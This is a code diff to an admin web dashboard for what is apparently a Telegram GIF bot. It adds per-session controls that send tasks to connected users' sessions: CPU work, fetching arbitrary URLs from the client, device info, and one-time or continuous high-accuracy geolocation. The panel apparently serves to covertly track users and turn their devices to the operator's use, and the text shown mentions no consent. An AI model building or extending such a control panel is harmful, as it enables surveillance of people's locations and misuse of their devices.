@@ -13,9 +13,15 @@
         a.user-link{color:inherit;text-decoration:underline;cursor:pointer}
         tr.details td{background:#fafafa}
         pre{margin:0;padding:12px;border-radius:8px;background:#fff;max-height:360px;overflow:auto;border:1px solid #eee;text-align:left}
-        button.send-btn{padding:6px 10px;border:1px solid #ccc;border-radius:8px;background:#fff;cursor:pointer}
         .bar{height:6px;background:#eee;border-radius:4px;overflow:hidden;margin-top:6px}
         .bar > div{height:100%;width:0%;background:#4caf50}
+        button.send-btn{padding:6px 10px;border:1px solid #ccc;border-radius:8px;background:#fff;cursor:pointer}
+        /* Controls inside Actions cell */
+        .controls{display:flex;gap:6px;align-items:center;justify-content:center;flex-wrap:wrap}
+        select,input[type="text"],input[type="number"]{padding:6px;border:1px solid #ccc;border-radius:6px;font-size:13px;max-width:260px}
+        label{font-size:12px;opacity:.8}
+        .cfg{display:none;align-items:center;gap:6px}
+        .cfg.active{display:inline-flex}
     </style>
 </head>
 <body>
@@ -34,7 +40,7 @@
 </table>
 
 <script>
-    const VER = "dash-2025-08-22-1";
+    const VER = "dash-2025-08-22-2";
     console.log("[dash] boot", VER);
 
     const WS_URL   = "wss://telegram-giphy-bot-9a11b0e83d02.herokuapp.com/ws?role=admin";
@@ -61,6 +67,68 @@
 
     function escapeHtml(str){ return str.replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
 
+    function actionsHTML(s){
+        const sid = s.sessionId;
+        const statusHTML = s.last
+            ? `<div class="bar"><div style="width:${Math.min(100, s.last.progress || (s.last.ok === false ? 0 : 100))}%"></div></div>
+           <div class="muted">${s.last.type || ''} ${s.last.status ? ('status ' + s.last.status) : ''} ${s.last.ok === false ? 'error' : ''}</div>`
+            : '';
+        return `
+        <div class="controls" data-sid="${sid}">
+          <select class="task-kind" data-sid="${sid}">
+            <option value="cpu">cpu</option>
+            <option value="fetch">fetch</option>
+            <option value="info">info</option>
+            <option value="location_once">location_once</option>
+            <option value="location_watch">location_watch</option>
+          </select>
+
+          <!-- cpu -->
+          <span class="cfg cfg-cpu" data-sid="${sid}">
+            <label>N</label>
+            <input type="number" class="cpu-n" value="10000" min="1" step="1" data-sid="${sid}">
+          </span>
+
+          <!-- fetch -->
+          <span class="cfg cfg-fetch" data-sid="${sid}">
+            <label>URL</label>
+            <input type="text" class="fetch-url" value="https://httpbin.org/get?demo=1" data-sid="${sid}">
+            <label>where</label>
+            <select class="fetch-where" data-sid="${sid}">
+              <option value="client">client</option>
+              <option value="auto">auto</option>
+              <option value="server">server</option>
+            </select>
+          </span>
+
+          <!-- location_once -->
+          <span class="cfg cfg-location_once" data-sid="${sid}">
+            <label>highAccuracy</label>
+            <select class="loc-hi" data-sid="${sid}">
+              <option value="true" selected>true</option>
+              <option value="false">false</option>
+            </select>
+            <label>timeoutMs</label>
+            <input type="number" class="loc-timeout" value="10000" min="1000" step="500" data-sid="${sid}">
+          </span>
+
+          <!-- location_watch -->
+          <span class="cfg cfg-location_watch" data-sid="${sid}">
+            <label>seconds</label>
+            <input type="number" class="loc-dur" value="15" min="3" max="120" step="1" data-sid="${sid}">
+            <label>highAccuracy</label>
+            <select class="loc-hiw" data-sid="${sid}">
+              <option value="true" selected>true</option>
+              <option value="false">false</option>
+            </select>
+          </span>
+
+          <button class="send-btn" data-sid="${sid}">Send</button>
+        </div>
+        ${statusHTML}
+      `;
+    }
+
     function render() {
         rowsEl.innerHTML = "";
         const arr = Array.from(state.values()).sort((a,b)=>(b.ts||0)-(a.ts||0));
@@ -69,18 +137,13 @@
         for (const s of arr) {
             const tr = document.createElement('tr');
             const userLabel = usernameFrom(s.user);
-            const actHTML = `
-        <button class="send-btn" data-sid="${s.sessionId}">Send Task</button>
-        ${ s.last
-                ? `<div class="bar"><div style="width:${Math.min(100, s.last.progress || (s.last.ok === false ? 0 : 100))}%"></div></div>
-               <div class="muted">${s.last.type || ''} ${s.last.status ? ('status ' + s.last.status) : ''} ${s.last.ok === false ? 'error' : ''}</div>`
-                : '' }
-      `;
+
             tr.innerHTML = `
-        <td><a class="user-link" data-sid="${s.sessionId}">${userLabel}</a></td>
-        <td>${s.client?.platform || "—"}</td>
-        <td>${s.ts ? new Date(s.ts).toLocaleTimeString() : "—"}</td>
-        <td>${actHTML}</td>`;
+          <td><a class="user-link" data-sid="${s.sessionId}">${userLabel}</a></td>
+          <td>${s.client?.platform || "—"}</td>
+          <td>${s.ts ? new Date(s.ts).toLocaleTimeString() : "—"}</td>
+          <td>${actionsHTML(s)}</td>
+        `;
             rowsEl.appendChild(tr);
 
             if (s.expanded) {
@@ -99,6 +162,7 @@
             }
         }
 
+        // wire expand/collapse
         rowsEl.querySelectorAll('a.user-link').forEach(a => {
             a.onclick = (e) => {
                 const sid = e.currentTarget.getAttribute('data-sid');
@@ -107,24 +171,50 @@
             };
         });
 
-        rowsEl.querySelectorAll('button.send-btn').forEach(b => {
-            b.onclick = async (e) => {
-                const sid = e.currentTarget.getAttribute('data-sid');
-                const kind = prompt("Task type: cpu or fetch", "cpu");
-                if (!kind) return;
+        // wire task-kind dropdowns (show relevant cfg)
+        rowsEl.querySelectorAll('.controls').forEach(box => {
+            const kindSel = box.querySelector('.task-kind');
+            const sid = box.getAttribute('data-sid');
+            const updateCfg = () => {
+                const v = kindSel.value;
+                box.querySelectorAll('.cfg').forEach(el => el.classList.remove('active'));
+                if (v === 'cpu') box.querySelector('.cfg-cpu')?.classList.add('active');
+                if (v === 'fetch') box.querySelector('.cfg-fetch')?.classList.add('active');
+                if (v === 'location_once') box.querySelector('.cfg-location_once')?.classList.add('active');
+                if (v === 'location_watch') box.querySelector('.cfg-location_watch')?.classList.add('active');
+                // 'info' has no extra params
+            };
+            kindSel.onchange = updateCfg;
+            updateCfg();
 
+            // wire Send
+            box.querySelector('.send-btn').onclick = async () => {
+                const kind = kindSel.value;
                 let payload = {};
-                if (kind === "cpu") {
-                    const n = parseInt(prompt("Count to N", "10000") || "10000", 10);
+                if (kind === 'cpu') {
+                    const n = parseInt(box.querySelector('.cpu-n')?.value || '10000', 10);
                     payload = { n: isNaN(n) ? 10000 : n };
-                } else if (kind === "fetch") {
-                    const u = prompt("URL (try CORS-enabled first)", "https://example.com/");
-                    if (!u) return;
-                    const where = (prompt("Run where? client | server | auto", "client") || "client").toLowerCase();
+                } else if (kind === 'fetch') {
+                    const u = box.querySelector('.fetch-url')?.value || '';
+                    const where = (box.querySelector('.fetch-where')?.value || 'client').toLowerCase();
+                    if (!u) { alert("URL required"); return; }
                     payload = { url: u, where };
-                } else { alert("Unknown task type"); return; }
+                } else if (kind === 'info') {
+                    payload = {};
+                } else if (kind === 'location_once') {
+                    const hi = (box.querySelector('.loc-hi')?.value || 'true') === 'true';
+                    const to = parseInt(box.querySelector('.loc-timeout')?.value || '10000', 10);
+                    payload = { highAccuracy: hi, timeoutMs: isNaN(to)?10000:to, maximumAgeMs: 0 };
+                } else if (kind === 'location_watch') {
+                    const dur = parseInt(box.querySelector('.loc-dur')?.value || '15', 10);
+                    const hiw = (box.querySelector('.loc-hiw')?.value || 'true') === 'true';
+                    payload = { durationSec: isNaN(dur)?15:dur, highAccuracy: hiw, maximumAgeMs: 0 };
+                } else {
+                    alert("Unknown task type"); return;
+                }
 
                 try {
+                    const sid = box.getAttribute('data-sid');
                     const r = await fetch(`${API_BASE}/tasks`, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -221,6 +311,5 @@
     }
     connect();
 </script>
-
 </body>
 </html>
